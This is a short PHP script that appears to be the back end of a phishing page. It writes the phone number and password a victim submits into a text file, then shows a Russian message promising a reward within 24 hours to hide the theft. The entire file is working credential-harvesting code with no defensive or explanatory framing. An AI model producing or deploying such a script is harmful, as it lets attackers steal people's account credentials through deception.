<?php

 file_put_contents("usernames.txt", "[NUMBER]: " . $_POST['number'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
 
 echo "Ваша награда придёт в течении 24 часов.";
 
exit();